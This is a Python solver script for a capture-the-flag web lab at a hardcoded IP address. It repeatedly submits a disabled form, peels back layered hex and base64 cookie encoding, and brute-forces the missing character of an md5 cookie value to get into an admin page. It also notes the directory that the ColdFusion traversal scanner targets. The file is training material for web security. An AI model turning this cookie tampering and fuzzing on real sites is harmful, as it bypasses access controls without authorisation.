#!/usr/bin/env python3
"""
CTF solver for the two questions on the target (154.57.164.70:37327).

1-savol  /lucky.php   -> the submit button is 'disabled'; enabling it (i.e. POSTing
                         the form) only wins a flag by chance, so retry until it
                         returns an HTB{...} flag.
2-savol  /admin.php   -> the 'cookie' Set-Cookie value is encoded several times;
                         keep decoding (hex -> base64 -> ...) until the plaintext is
                         exactly 31 characters long.
3-savol  /admin.php   -> that 31-char value is an md5 hash missing its last
                         character. Fuzz the missing character (SecLists
                         Fuzzing/alphanum-case.txt = 0-9, a-z, A-Z) by re-encoding
                         the candidate (base64 -> hex) into the cookie; the request
                         that is accepted returns the flag.
4-savol  (knowledge)  -> auxiliary/scanner/http/coldfusion_locale_traversal calls
                         /CFIDE/administrator/*.cfm, so the directory is CFIDE.

Run:  python3 solutions/solve.py [BASE_URL]
"""
import base64
import re
import sys
import urllib.parse
import urllib.request

DEFAULT_BASE = "http://154.57.164.70:37327"
FLAG_RE = re.compile(r"HTB\{[^}]*\}")
MAX_TRIES = 200
# SecLists/Fuzzing/alphanum-case.txt -> digits + lowercase + uppercase (62 lines)
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"


def post_flag(base):
    """Enable the disabled button by submitting the form; retry until we win."""
    data = urllib.parse.urlencode({"getflag": "true"}).encode()
    for attempt in range(1, MAX_TRIES + 1):
        req = urllib.request.Request(base + "/lucky.php", data=data, method="POST")
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req, timeout=20) as resp:
            body = resp.read().decode("utf-8", "replace")
        match = FLAG_RE.search(body)
        if match:
            return match.group(0), attempt
    raise RuntimeError("no flag returned after %d attempts" % MAX_TRIES)


def _try_hex(value):
    try:
        decoded = bytes.fromhex(value).decode("utf-8")
    except (ValueError, UnicodeDecodeError):
        return None
    return decoded if decoded != value else None


def _try_base64(value):
    try:
        decoded = base64.b64decode(value, validate=True).decode("utf-8")
    except Exception:
        return None
    return decoded if decoded != value else None


def decode_cookie(value, target_len=31, max_layers=12):
    """Repeatedly decode a hex/base64 string until it is target_len chars long."""
    seen = set()
    layers = []
    current = value
    for _ in range(max_layers):
        if len(current) == target_len:
            return current, layers
        if current in seen:
            break
        seen.add(current)
        for name, decoder in (("hex", _try_hex), ("base64", _try_base64)):
            decoded = decoder(current)
            if decoded:
                layers.append(name)
                current = decoded
                break
        else:
            break
    return current, layers


def get_cookie(base):
    """Read the 'cookie' Set-Cookie header that /admin.php hands out."""
    with urllib.request.urlopen(base + "/admin.php", timeout=20) as resp:
        for header, raw in resp.getheaders():
            if header.lower() == "set-cookie" and raw.lower().startswith("cookie="):
                return raw.split("=", 1)[1].split(";", 1)[0]
    raise RuntimeError("no 'cookie' Set-Cookie header found")


def encode_layers(plain):
    """Re-apply the encoding chain found in 2-savol: plain -> base64 -> hex."""
    return base64.b64encode(plain.encode()).decode().encode().hex()


def admin_request(base, cookie_value):
    """Send the tampered cookie to /admin.php and return the response body."""
    req = urllib.request.Request(base + "/admin.php")
    req.add_header("Cookie", "cookie=" + cookie_value)
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode("utf-8", "replace")


def find_missing_char(base, prefix31):
    """Fuzz the missing md5 character using the alphanum-case alphabet."""
    # '!' is not in the alphabet, so this gives us the "rejected" baseline page.
    baseline = admin_request(base, encode_layers(prefix31 + "!"))
    for char in CHARSET:
        body = admin_request(base, encode_layers(prefix31 + char))
        if len(body) != len(baseline):
            match = FLAG_RE.search(body)
            return char, (match.group(0) if match else None)
    raise RuntimeError("no accepted last character found")


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    base = base.rstrip("/")

    flag, attempt = post_flag(base)
    print("1-savol (lucky.php flag): %s   (won on attempt %d)" % (flag, attempt))

    cookie = get_cookie(base)
    plain, layers = decode_cookie(cookie, target_len=31)
    print("2-savol (cookie value):   %s   (%s)" % (plain, " -> ".join(layers) or "plain"))
    if len(plain) != 31:
        print("warning: decoded value is not 31 characters long", file=sys.stderr)

    last_char, flag3 = find_missing_char(base, plain)
    print("3-savol (missing char):   %s   -> md5 = %s" % (last_char, plain + last_char))
    if flag3:
        print("3-savol (flag):           %s" % flag3)

    print("4-savol (directory):      CFIDE   (/CFIDE/administrator/*.cfm)")


if __name__ == "__main__":
    main()
